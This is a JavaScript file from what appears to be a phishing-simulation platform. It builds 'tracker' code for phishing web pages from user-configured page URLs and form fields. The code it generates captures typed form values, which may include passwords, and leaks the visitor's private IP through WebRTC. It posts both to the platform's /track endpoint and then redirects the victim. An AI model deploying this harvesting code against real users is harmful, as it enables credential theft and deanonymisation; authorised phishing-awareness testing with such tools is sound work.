var form_fields_and_values = {};
var dt;
var g_tracker_id  = "", globalModalValue = '';;
var tracker_step_data = {};
var webpage_data = [];
var all_form_fields = `<div class="row mb-3 HTML_form_field">
                          <div class="col-md-3">
                             <select class="select2 form-control" style="width: 100%; height:36px;" name="field_type_names">
                                  <option value="None">None</option>
                                  <option value="TF">Text Field</option>
                                  <option value="CB">CheckBox</option>
                                  <option value="RB">Radio Button</option>
                                  <option value="TA">Text Area</option>
                                  <option value="Select">Select (Dropdown)</option>
                                  <option value="FSB">Form Submit Button (Required)</option>
                              </select>
                          </div>
                          <div class="col-lg-3">
                              <input type="text" name="field_id_names" class="form-control" placeholder="NA">
                          </div>
                          <div>
                              <div class="custom-control custom-checkbox mr-sm-2 m-t-5">
                                  <label>
                                      <input type="checkbox" name="cb_field_track" class="custom-control-input" checked>
                                      <div class="custom-control-label" data-toggle="tooltip" title="Track field" data-placement="right"></div>
                                  </label>
                              </div>
                          </div>
                          <div class="col-lg-1">                            
                              <button type="button" class="btn btn-info btn-sm remove_field" data-toggle="tooltip" title="Remove field">-</button>
                          </div>
                      </div>`;
var webpages = `<div class="new_webpage sort-blur m-t-5">
                               <div class="form-group row">
                                  <label for="field_page_name" class="col-md-2 text-left control-label col-form-label">Page name:</label>
                                  <div class="col-md-4">
                                     <input type="text" class="form-control" name="field_page_name" placeholder="eg: login page">
                                  </div>
                                  <div class="col-md-2">                                     
                                  </div>
                                  <div class="col-md-2">
                                     <button class="btn btn-info btn-sm bt_import_html_fields" data-toggle="tooltip" title="Import HTML fields"><i class="fas fa-fill-drip"></i></button>
                                  </div>
                                  <div class="col-md-2 text-right">
                                     <span class="badge badge-secondary">Page:<span class="webpage_count">1</span></span><i class="m-l-5 fas fa-arrows-alt cursor-pointer icon_move" data-toggle="tooltip" title="Page order"></i>
                                  </div>
                               </div>
                               <div class="form-group row">
                                  <label for="field_page_name" class="col-md-2 text-left control-label col-form-label">Page URL:</label>
                                  <div class="col-md-4">
                                     <input type="text" class="form-control" name="field_page_url" placeholder="eg: https://myphishingsite.com/login">
                                  </div>
                               </div>
                               <div class="row">
                                  <div class="col-md-12">
                                     <label for="phising_site_form_page_url" class="text-left control-label col-form-label">Form elements:</label>
                                     <span class="form_fields_area">` + all_form_fields +
                                     `</span>
                                     <div class="row">
                                        <div class="col-md-8">
                                           <button class="btn btn-info btn-sm bt_add_field_set">Add Field</button>
                                        </div>
                                        <div class="col-md-2">
                                           <div class="custom-control custom-checkbox">
                                              <label>
                                                 <input type="checkbox" class="custom-control-input" name="cb_link_next_page" checked>
                                                 <div class="custom-control-label">Link next page</div>
                                              </label>
                                           </div>
                                        </div>
                                        <div class="col-md-2 text-right">
                                           <button class="btn btn-info btn-sm bt_add_next_page" data-toggle="tooltip" title="Add page"><i class="fas fa-level-down-alt"></i></button>
                                           <button class="btn btn-danger btn-sm bt_delete_page" data-toggle="tooltip" title="Delete page"><i class="fas fa-trash"></i></button>
                                        </div>
                                     </div>
                                  </div>
                               </div>
                            </div>`;

var beauty_op = {
  "indent_size": "4",
  "indent_char": " ",
  "max_preserve_newlines": "5",
  "preserve_newlines": true,
  "keep_array_indentation": false,
  "break_chained_methods": false,
  "indent_scripts": "normal",
  "brace_style": "collapse",
  "space_before_conditional": true,
  "unescape_strings": false,
  "jslint_happy": false,
  "end_with_newline": false,
  "wrap_line_length": "0",
  "indent_inner_html": false,
  "comma_first": false,
  "e4x": false,
  "indent_empty_lines": false
};

function deletePageAction(){
    globalModalValue.tooltip('hide');
    globalModalValue.closest('.new_webpage').remove();
    updateFieldChanges();
    $('#modal_prompts').modal('toggle'); 
}

function startHTMLFieldFetch(){
    $("#tb_import_url").removeClass("is-invalid");
    $("#ta_HTML_content").removeClass("is-invalid");
    $("#lb_progress").removeClass("invalid-feedback");

    if($("#tb_import_url").val() == '' && $("#ta_HTML_content").val() == ''){
        $("#tb_import_url").addClass("is-invalid");
        $("#ta_HTML_content").addClass("is-invalid");
        $("#lb_progress").text("");
        $("#progressbar_status").width("0%");
        return;
    }
    $("#lb_progress").show();
    $("#lb_progress").text("Fetching...");
    $("#progressbar_status").width(30 + "%");

    if($("#tb_import_url").val() != ''){
        $.post("web_tracker_generator_list_manager", {
                action_type: "get_html_content",
                url: $("#tb_import_url").val()
            },
            function(data, status) {
                if (data != "error")
                    processHTMLFieldFetch(data);
                else {
                    $("#lb_progress").text("Error getting page content! Check the URL.");
                    $("#lb_progress").addClass("invalid-feedback");
                    $("#progressbar_status").width(100 + "%");
                }
            });
    }
    else
        processHTMLFieldFetch($("#ta_HTML_content").val());

}

function processHTMLFieldFetch(html_content){
    var form_elements = $(html_content).find('input,textarea');

    if(form_elements.length>0){
        var ff_area = globalModalValue.closest(".new_webpage").find(".form_fields_area");
        ff_area.empty();

        $(form_elements).each(function(){
            ff_area.append(all_form_fields);
            var node = $(this).prop("tagName")=="TEXTAREA"?"textarea":$(this).attr("type");

            switch(node){
                case "checkbox" :   ff_area.find('select[name="field_type_names"]:last').val("CB").change();
                                    ff_area.find('input[name="field_id_names"]:last').val($(this).attr("id"));
                                    break;
                case "radio" :      ff_area.find('select[name="field_type_names"]:last').val("RB").change();
                                    ff_area.find('input[name="field_id_names"]:last').val($(this).attr("name"));
                                    break;
                case "textarea" :   ff_area.find('select[name="field_type_names"]:last').val("TA").change();
                                    ff_area.find('input[name="field_id_names"]:last').val($(this).attr("id"));
                                    break;
                case "select" :     ff_area.find('select[name="field_type_names"]:last').val("Select").change();
                                    ff_area.find('input[name="field_id_names"]:last').val($(this).attr("id"));
                                    break;
                case "submit" :
                case "button" :     ff_area.find('select[name="field_type_names"]:last').val("FSB").change();
                                    ff_area.find('input[name="field_id_names"]:last').val($(this).attr("id"));
                                    break;
                case "hidden" :     ff_area.children().last().remove(); //remove lst added input field

                default :           ff_area.find('select[name="field_type_names"]:last').val("TF").change();    //default text input fields
                                    ff_area.find('input[name="field_id_names"]:last').val($(this).attr("id"));
                                    break;
            }            
        });
        $("#lb_progress").text("Finished!");
        $("#progressbar_status").width(100 + "%");
    }
    else{
        $("#lb_progress").text("Finished. No HTML input fields identified!");
        $("#lb_progress").addClass("invalid-feedback");
        $("#progressbar_status").width(100 + "%");
    }
    updateFieldChanges();        
}

$(document).ready(function() { 
    $('#webpages_area').append(webpages);   
    updateFieldChanges();
    $( "#webpages_area" ).sortable({
        handle: '.icon_move',
        start: function(e, ui){            
            $("#webpages_area").addClass("sort-size");
        },
        stop: function(e, ui){        
            $("#webpages_area").removeClass("sort-size");    
            updateFieldChanges();
        },
    });

    //When user click on add input button
    $("#webpages_area").on("click", ".bt_add_field_set", function(e) {
        e.preventDefault(); 
        $(this).closest('.new_webpage').find(".form_fields_area").append(all_form_fields); //add input field
        updateFieldChanges();
        $('.select2-selection__rendered').removeAttr('title'); //removes title attr
        updateFieldChanges();
    });

    //when user click on remove button
    $("#webpages_area").on("click", ".remove_field", function(e) {
        $('[data-toggle="tooltip"]').tooltip('hide');
        if($(this).closest('.new_webpage').find(".form_fields_area").children().length > 1)
            $(this).closest('.HTML_form_field').remove(); //remove input field
        else
            $(this).closest('.form_fields_area').find('select').val("None").trigger("change");
        updateFieldChanges();
    });

    $("#webpages_area").on("click", ".bt_add_next_page", function(e) {
        e.preventDefault();      
        $(this).closest('.new_webpage').after(webpages);        
        $('.select2-selection__rendered').removeAttr('title'); //removes title attr
        updateFieldChanges();
    });

    $("#webpages_area").on("click", ".bt_delete_page", function(e) {
        e.preventDefault();    
        $("#modal_prompts_body").html("<p>Delete the page?</p><p><i>Note: If no form fields are added, only the page visit is tracked</i></p>");
        $("#modal_prompts_confirm_button").replaceWith(`<button type="button" class="btn btn-danger" onClick="deletePageAction()">Confirm</button>`);
        $('#modal_prompts').modal('toggle'); 
        globalModalValue = $(this);
    });

    $("#webpages_area").on("click", ".bt_import_html_fields", function(e) {
        e.preventDefault();
        $('#modal_import_html_fields').modal('toggle'); 
        globalModalValue = $(this);
    });

    $('.bt_delete_page_first').click(function(e) {
        e.preventDefault();      
        $("#webpages_area").append(webpages);
        updateFieldChanges();
    });

    $("#webpages_area").on("change", ".select2", function() {
        $(this).closest(".HTML_form_field").find("[name='cb_field_track']").prop('disabled', false);
        $('.select2-selection__rendered').removeAttr('title'); //removes title attr
        switch ($(this).val()) {
            case 'TF':
                $(this).closest(".HTML_form_field").find("[name='field_id_names']").attr("placeholder", "Text field id attribute value");
                break;
            case 'CB':
                $(this).closest(".HTML_form_field").find("[name='field_id_names']").attr("placeholder", "Checkbox id attribute value");
                break;
            case 'RB':
                $(this).closest(".HTML_form_field").find("[name='field_id_names']").attr("placeholder", "Radio button group name attribute value");
                break;
            case 'Select':
                $(this).closest(".HTML_form_field").find("[name='field_id_names']").attr("placeholder", "Select (dropdown) list id value");
                break;
            case 'TA':
                $(this).closest(".HTML_form_field").find("[name='field_id_names']").attr("placeholder", "Select TextArea id value");
                break;
            case 'FSB':
                $(this).closest(".HTML_form_field").find("[name='field_id_names']").attr("placeholder", "Form Submit button id value");
                $(this).closest(".HTML_form_field").find("[name='cb_field_track']").prop('checked', true).prop('disabled', true);
                break;
            default:
                $(this).parent().next().children().attr("placeholder", "NA");
                break;
        }
        var arr_filed_types = $.map($(this).closest(".form_fields_area").find('select[name="field_type_names"]'), function(e) {
                                         return $('option:selected', e).val()=="FSB"?"FSB":null;
                                     });
        if(arr_filed_types.length>1)
            toastr.error('', 'Multiple submission buttons not allowed');
    });

    //------------------------------------------

    $('#bt_delete_tracker_confirm').click(function(e) {
        deleteTrackerTemplate_action($(this).data('data-tracker_id'));
    });

    $('#bt_copy_tracker_confirm').click(function(e) {
        makeCopyTrackerTemplate_action($(this).data('data-tracker_id'));
    });

    $(document).on("click", "button[name='web_tracker_status_button']", function() {
        $(this).tooltip('toggle');
        if ($(this).data('status_value') == "0")
            $(this).after('<button type="button" class="btn btn-dark btn-sm" data-toggle="tooltip" data-placement="top" title="Start/Resume Tracking" data-tracker_id="' + $(this).data('tracker_id') + '" data-status_value="1" name="web_tracker_status_button"><i class="mdi mdi-play"></i></button>');
        else
            $(this).after('<button type="button" class="btn btn-success btn-sm" data-toggle="tooltip" data-placement="top" title="Pause/Stop Tracking" data-tracker_id="' + $(this).data('tracker_id') + '" data-status_value="0" name="web_tracker_status_button"><i class="mdi mdi-stop"></i></button>');

        $(this).tooltip('hide');
        $(this).remove();

        $.post("web_tracker_generator_list_manager", {
                action_type: "pause_stop_tracker_tracking",
                tracker_id: $(this).data('tracker_id'),
                action_value: $(this).data('status_value')
            },
            function(data, status) {
                if (data != "success") {
                    toastr.error('', 'Error changing status!');
                }
            });

        $('[data-toggle="tooltip"]').tooltip({ trigger: "hover" });
    });

    $('[data-toggle="tooltip"]').tooltip({ trigger: "hover" });
});

function updateFieldChanges(){
  $('[data-toggle="tooltip"]').tooltip('hide');
  $(".new_webpage").each(function(i,page){
      $(page).find(".webpage_count").text(i+1);
      $(page).find(".bt_delete_page").prop('disabled', false);
  });

  $(".form_fields_area").each(function(i,field){
    if($(field).find(".HTML_form_field").length==1)
      $(field).find(".remove_field:first").prop('disabled', true);
    else
      $(field).find(".remove_field:first").prop('disabled', false);
  });

  if($("#webpages_area div").children().length == 0){
    $("#phising_site_final_page_url").attr('disabled', true);
    $(".bt_delete_page_first").attr("hidden",false);
  }   
  else{
    $("#phising_site_final_page_url").attr('disabled', false);
    $(".bt_delete_page_first").attr("hidden",true);
  }   

  $(".select2").select2({
      minimumResultsForSearch: -1,
  });
  $('[data-toggle="tooltip"]').tooltip({ trigger: "hover" });
}

function generateFormFields() {
    webpage_data = {};
    webpage_data.count = $('.new_webpage').length;
    webpage_data.data = [];
    $('.new_webpage').each(function(i, obj) {
        webpage_data.data[i] = {};
        var form_fields_and_values = {};

        webpage_data.data[i].page_name=$(obj).find("[name='field_page_name']").val();
        webpage_data.data[i].page_url=$(obj).find("[name='field_page_url']").val();
        webpage_data.data[i].link_next_page=$(obj).find("[name='cb_link_next_page']").is(':checked');

        //finding next page url
        if(i+1 < $('.new_webpage').length)
            webpage_data.data[i].next_page_url= $('.new_webpage:eq(' + (i+1) + ')').find("[name='field_page_url']").val();
        else
            webpage_data.data[i].next_page_url= $("#phising_site_final_page_url").val();

        //-----------
        var arr_filed_types = $.map($(obj).find('select[name="field_type_names"]'), function(e) {
            return $('option:selected', e).val();
        });

        var arr_filed_values = $(obj).find('input[name="field_id_names"]').map(function() {
            return JSON.parse('{"idname":"' + $(this).val() + '","track":' + $(this).closest(".HTML_form_field").find("[name='cb_field_track']").is(':checked') + '}');  //eg: TA_ta1: Object { idname: "", track: true }
        }).get();

        var j = 0;
        $.each(arr_filed_types, function(i, e) {
            if (arr_filed_types[i] == "FSB")
                form_fields_and_values[arr_filed_types[i]] = arr_filed_values[i];
            else
                form_fields_and_values[arr_filed_types[i] + "_" + arr_filed_values[i].idname] = arr_filed_values[i];
        });
        webpage_data.data[i].form_fields_and_values=form_fields_and_values;
    });
}

function getNextTrackerId() {
    g_tracker_id = Math.random().toString(36).substring(2, 8);
    return g_tracker_id;
}

function generateTrackerCode() {
    var req_par = "";
    var code_output = [];
    code_output['html_login'] = "";
    code_output['html_form'] = "";
    code_output['js'] = "";
    code_output['php'] = "";
    $('#tracker_code_area').empty();
    $('#html_area').empty();
    $('#js_area').empty();
    $('#others_area').empty();

    if(g_tracker_id == "")
        getNextTrackerId();

    //----------Tracker code-------
    $('#tracker_code_area').append(`<div class="row">
                         <div class="col-md-12">
                            <div class="alert alert-success bottom-space-dec" role="alert">
                               Add the following tracker code to all pages of phishing website
                            </div>
                            <div class="col-md-12 prism_side-top">
                                <span>
                                    <button type="button" class="btn waves-effect waves-light btn-xs btn-dark mdi mdi-download" data-toggle="tooltip" title="Download" onClick="downloadCode('html_tracker_code')"/>
                                    <button type="button" class="btn waves-effect waves-light btn-xs btn-dark mdi mdi-content-copy btn_copy" data-toggle="tooltip" title="Copy" onclick="copyCode('html_tracker_code')"/>
                                </span>
                            </div>
                            <pre><code class="language-html html_tracker_code"></code></pre>
                        </div>
                    </div>`);
    var tracker_link = `<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
                        <script src="` + location.origin + `/mod?tlink=` + g_tracker_id + `"></script>`
    $('.html_tracker_code').text(html_beautify(tracker_link));

    //----------HTML-----
    
    $.each(webpage_data.data, function(i, obj) {        
        code_output['html_form'] = "";
        $('#html_area').append(`<div class="row m-b-10">
                                    <div class="col-md-12">
                                        <div class="alert alert-primary bottom-space-dec" role="alert">
                                           Your ` + webpage_data.data[i].page_name + ` (` + webpage_data.data[i].page_url + `) would look like below: 
                                        </div> 
                                        <div class="col-md-12 prism_side-top">
                                            <span><button type="button" class="btn waves-effect waves-light btn-xs btn-dark mdi mdi-download" data-toggle="tooltip" title="Download" onClick="downloadCode('html_code_class_` + i + `','` + webpage_data.data[i].page_url + `')"/><button type="button" class="btn waves-effect waves-light btn-xs btn-dark mdi mdi-content-copy btn_copy" data-toggle="tooltip" title="Copy" onclick="copyCode('html_code_class_` + i + `')"/></span>
                                        </div>  
                                        <pre><code class="language-html html_code_class_` + i + `"></code></pre>
                                    </div>
                                </div>`);

        $.each(webpage_data.data[i].form_fields_and_values, function(form_field_type, form_field) {
            if (form_field_type.startsWith("TF_"))
                code_output['html_form'] += form_field.idname + `:<input type="text" id="` + form_field.idname + `">`;
            if (form_field_type.startsWith("CB_"))
                code_output['html_form'] += form_field.idname + `:<input type="checkbox" id="` + form_field.idname + `">`;
            if (form_field_type.startsWith("RB_"))
                code_output['html_form'] += form_field.idname + `:<input type="radio" name="` + form_field.idname + `">`;
            if (form_field_type.startsWith("TA_"))
                code_output['html_form'] += form_field.idname + `:<textarea rows="4" cols="50" id="` + form_field.idname + `"></textarea>`;
            if (form_field_type.startsWith("Select_"))
                code_output['html_form'] += `\t` + form_field.idname + `:<select id="` + form_field.idname + `"><option value="1">Value 1</option>
            <option value="2">Value 2</option></select>`;
        });
        code_output['html_form'] += `<input type="button" id="` + webpage_data.data[i].form_fields_and_values.FSB.idname + `" value="Submit">`;
        $('.html_code_class_' + i).text(html_beautify(`<!DOCTYPE html>`+formatHTML(`<form>` + code_output['html_form'] + `</form>`),beauty_op));
    });

    //-----------JS--------
    if ($("#cb_private_ip").is(':checked'))
        req_par += "private_ip : private_ip,";

    code_output['js'] += `var private_ip = "";
    var sess_id ="";
    var comp_name = "";
    var comp_username = "";
    var tracker_id = "` + g_tracker_id + `";
    var form_field_data;

    //geting cid
    var url = new URL(window.location.href);
    var cid = url.searchParams.get("cid");

    //creating session cookie
    if (document.cookie.indexOf("tsess_id=") >= 0) { // cookie exists
        sess_id = $.map(document.cookie.split(';'), function(val) {if(val.split('=')[0].trim() == 'tsess_id') return val.split('=')[1]})[0].trim();
    } else {
        sess_id = Math.random().toString(36).substring(8);
        document.cookie = "tsess_id=" + sess_id + ";SameSite=Lax";
    }
        
    window.RTCPeerConnection = window.RTCPeerConnection ||
                             window.mozRTCPeerConnection ||
                             window.webkitRTCPeerConnection;  

    function pvtIP (cb) {
        var pc = new RTCPeerConnection ({iceServers: []}),
        noop = () => {};
        
        pc.onicecandidate = ice => 
        cb = cb ((ice = ice && ice.candidate && ice.candidate.candidate)
                ? ice.split(' ')[4]
                : 'unavailable') || noop;
        pc.createDataChannel ("");  
        pc.createOffer (pc.setLocalDescription.bind (pc), noop);
    };
    `;

    code_output['js'] += `pvtIP(addr => {  
        private_ip = addr;
        `;

        if(webpage_data.count != 0) 
          code_output['js'] +=`if(window.location.href.split('?')[0].toLowerCase() == "` + webpage_data.data[0].page_url.toLowerCase() + `") //if starting page
        `;
       
        code_output['js'] += `do_track_req_visit();
    });
    `;

    code_output['js'] += `function do_track_req_visit() {
                        $.post("` + location.origin + `/track", {
                            page : 0,
                            trackerId : tracker_id,
                            sess_id : sess_id,` + req_par + `
                            cid : cid
                        },
                        function(data, status) {});
                        }\r\n//-----------------------------------------------------------
                        $(function() {`;

    $.each(webpage_data.data, function(i, obj) {
        var code_output_sub = "";
        
        $.each(webpage_data.data[i].form_fields_and_values, function(key, form_field) {
            if(!form_field.track){  
                code_output_sub += `form_field_data["` + form_field.idname + `"]="NT";`;
            }
            else{
                

                value = form_field.idname;

                if (key.startsWith("TF_") || key.startsWith("TA_") || key.startsWith("Select_"))
                  code_output_sub += `form_field_data["` + form_field.idname + `"]=$('#` + form_field.idname + `').val();`;
                if (key.startsWith("CB_")) {
                  code_output_sub += `if ($("#` + form_field.idname + `").is(':checked'))
                                          form_field_data["` + form_field.idname + `"] = true;
                                      else
                                          form_field_data["` + form_field.idname + `"] = false;`;
                  
                }

                if (key.startsWith("RB_")) {
                  code_output_sub += `if($("input:radio[name='` + form_field.idname + `']").is(":checked")) //RadioButton
                                          form_field_data["` + form_field.idname + `"] = $("input[name='` + form_field.idname + `']:checked").val();
                                      else
                                          form_field_data["` + form_field.idname + `"] = "";`;
                }
            }
        });


        code_output['js'] += `$("#` + webpage_data.data[i].form_fields_and_values.FSB.idname + `").click(function(e) { 
                                  form_field_data = {};`                            
                                  + code_output_sub +
                                  `do_track_req(e,` + (i+1) + `,"` + webpage_data.data[i].next_page_url + `");
                              });
                              `;  
                        
    });

    code_output['js'] += `});
                    //-----------------------------------------------------------
                    function do_track_req(e,page,next_page_url){
                      e.preventDefault();      
                      $.post("` + location.origin + `/track", {
                        page : page,
                        trackerId : tracker_id,
                        sess_id : sess_id,
                        form_field_data : JSON.stringify(form_field_data),` + req_par + `
                        cid : cid
                      },
                      function(data, status) {
                          window.top.location.href = next_page_url + "?cid=" + cid;
                      });
                  }`;  

    $('#js_area').append(`<div class="row">
                         <div class="col-md-12">
                            <div class="alert alert-primary bottom-space-dec" role="alert">
                               Contents of tracker script
                            </div>
                            <div class="col-md-12 prism_side-top">
                                <span>
                                    <button type="button" class="btn waves-effect waves-light btn-xs btn-dark mdi mdi-download" data-toggle="tooltip" title="Download" onClick="downloadCode('code_class_js')"/>
                                    <button type="button" class="btn waves-effect waves-light btn-xs btn-dark mdi mdi-content-copy btn_copy" data-toggle="tooltip" title="Copy" onclick="copyCode('js_code_class')"/>
                                </span>
                            </div>
                            <pre><code class="language-js js_code_class"></code></pre>
                        </div>
                    </div>`);
    $('.js_code_class').text(js_beautify(code_output['js'],beauty_op));

    $('[data-toggle="tooltip"]').tooltip({ trigger: "hover" });
    Prism.highlightAll();
}

//-------Start ClipboarJS -----

function copyCode(copy_code_class){
    var c = new ClipboardJS('.btn_copy', {
        target: function(trigger) {
            return document.querySelector('.'+copy_code_class);
        }
    });

    c.on('success', function(event) {
        event.clearSelection();
        event.trigger.textContent = 'Copied';
        window.setTimeout(function() {
            event.trigger.textContent = '';
            $('[data-toggle="tooltip"]').tooltip('hide');
        }, 2000);
    });    
}
//-------End ClipboarJS -----

function downloadCode(code_area, file_name) {
    var a = window.document.createElement('a');
    a.href = window.URL.createObjectURL(new Blob([$('.' + code_area).text()], { type: 'text/html'}));

    if(code_area.startsWith("html"))
        a.download = file_name.split("/").pop();
    else
        a.download = 'tracker_scripts.js';

    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

function downloadCodeAsZip() {
    var zip = new JSZip();
    var js_code_link = $(".html_tracker_code").text();
    $($("[class*='html_code_class_']")).each(function(i, obj) {
        zip.file(webpage_data.data[i].page_url.split('/').pop(), `<!DOCTYPE html>\r\n` + js_code_link + "\r\n" + $(obj).text().replace("<!DOCTYPE html>", ""));
    });

    // Generate the zip file asynchronously
    zip.generateAsync({
        type: "blob"
    }).then(function(content) {
        // Force down of the Zip file
        var a = window.document.createElement('a');
        a.href = window.URL.createObjectURL(new Blob([content], {
            type: 'application/octet-stream'
        }));
        a.download = 'public_html.zip';
        document.body.appendChild(a);
        a.click();

        // Remove anchor from body
        document.body.removeChild(a);
    });   
}

function saveWebTracker(tracker_id) {
    if(tracker_id == "")
        tracker_id = g_tracker_id;

    tracker_step_data['start'] = {};
    tracker_step_data['trackers'] = {};
    tracker_step_data['web_forms']= {};
    tracker_code_output = {};
    tracker_code_output['web_forms_code'] = {};


    tracker_step_data['start']['tb_tracker_name'] = $('#tb_tracker_name').val();
    tracker_step_data['start']['cb_auto_ativate'] = $("#cb_auto_ativate").is(':checked');

    //------------------------------------------

    tracker_step_data['trackers']['cb_visit_time'] = $("#cb_visit_time").is(':checked');
    tracker_step_data['trackers']['cb_public_ip'] = $("#cb_public_ip").is(':checked');
    tracker_step_data['trackers']['cb_private_ip'] = $("#cb_private_ip").is(':checked');
    tracker_step_data['trackers']['cb_browser'] = $("#cb_browser").is(':checked');
    tracker_step_data['trackers']['cb_os'] = $("#cb_os").is(':checked');
    tracker_step_data['trackers']['cb_ua'] = $("#cb_ua").is(':checked');

    //---------Web Pages-------------
    tracker_step_data['web_forms'] = webpage_data;

    $($("[class*='html_code_class_']")).each(function(i, obj) {
        tracker_code_output['web_forms_code'][i] = $(obj).text();
    });

    tracker_code_output['js_tracker'] = $('.js_code_class').text();

    enableDisableMe($('#genreator-form').find('a[href="#finish"]'));
    $.post("web_tracker_generator_list_manager", {
            action_type: "save_web_tracker",
            tracker_id: tracker_id,
            tracker_step_data: btoa(JSON.stringify(tracker_step_data)),
            tracker_code_output: btoa(JSON.stringify(tracker_code_output)),
        },
        function(data, status) {
            if (data == "success") {
                toastr.success('', 'Saved successfully!');
            } else {
                toastr.error('', 'Error saving data!');
            }
            enableDisableMe($('#genreator-form').find('a[href="#finish"]'));
            window.history.replaceState(null,null, location.pathname + '?tracker=' + tracker_id);
        });
}

function editWebTracker(tracker_id) {
    g_tracker_id = tracker_id;
    $.post("web_tracker_generator_list_manager", {
            action_type: "get_web_tracker_from_id",
            tracker_id: tracker_id
        },
        function(data, status) {
            $('#tracker_name').text(data['tracker_name']);
            $('#tb_tracker_name').val(data['tracker_name']);
            var tracker_step_data = JSON.parse(data['tracker_step_data']);

            $.each(tracker_step_data['trackers'], function(name_id,val) {   
                $('#' + name_id).prop('checked', val);
            });    

            $('#cb_auto_ativate').trigger('click').prop('checked', tracker_step_data['start']['cb_auto_ativate']);       

            //---form page----
            $('#webpages_area').empty();
            $.each(tracker_step_data.web_forms.data, function(i, web_form) {
                $('#webpages_area').append(webpages);
                var nth_web_form = $('#webpages_area').find(".new_webpage:eq(" + i + ")");
                nth_web_form.find(".form_fields_area").empty();
                nth_web_form.find("[name='field_page_name']").val(web_form.page_name);
                nth_web_form.find("[name='field_page_url']").val(web_form.page_url);
                nth_web_form.find("[name='cb_link_next_page']").prop('checked', web_form.link_next_page);

                $.each(web_form.form_fields_and_values, function(field_id, field_value) {
                    nth_web_form.find(".bt_add_field_set").trigger("click");
                    nth_web_form.find('input[name="cb_field_track"]:last').prop('checked', field_value.track);
                    if (field_id.startsWith("TF_") || field_id.startsWith("CB_") || field_id.startsWith("RB_") || field_id.startsWith("TA_")) {
                        nth_web_form.find('select[name="field_type_names"]:last').val(field_id.substr(0, 2)).change();
                        nth_web_form.find('input[name="field_id_names"]:last').val(field_value.idname);
                    }
                    if (field_id.startsWith("Select_")) {
                        nth_web_form.find('select[name="field_type_names"]:last').val("Select").change();
                        nth_web_form.find('input[name="field_id_names"]:last').val(field_value.idname);
                    }
                    if (field_id.startsWith("FSB")) {
                        nth_web_form.find('select[name="field_type_names"]:last').val("FSB").change();
                        nth_web_form.find('input[name="field_id_names"]:last').val(field_value.idname);
                    }
                });
                
            });

            if(tracker_step_data.web_forms.count>0)
              $('#phising_site_final_page_url').val(tracker_step_data.web_forms.data[tracker_step_data.web_forms.data.length-1].next_page_url); //from last object
            updateFieldChanges();
            $('[data-toggle="tooltip"]').tooltip({ trigger: "hover" });
        }).fail(function() {
        toastr.error('', 'Error getting tracker data!');
    });
}

function formatHTML(str) {
    
    var div = document.createElement('div');
    div.innerHTML = str.trim();
    var html_cont= formatHTML_child(div, 0).innerHTML;
    return html_cont.replace(/(^[ \t]*\n)/gm, "");
}

function formatHTML_child(node, level) {    
    var indentBefore = new Array(level++ + 1).join('  '),
        indentAfter  = new Array(level - 1).join('  '),
        textNode;
    
    for (var i = 0; i < node.children.length; i++) {        
        textNode = document.createTextNode('\n' + indentBefore);
        node.insertBefore(textNode, node.children[i]);
        
        formatHTML_child(node.children[i], level);
        
        if (node.lastElementChild == node.children[i]) {
            textNode = document.createTextNode('\n' + indentAfter);
            node.appendChild(textNode);
        }
    }    
    return node;
}




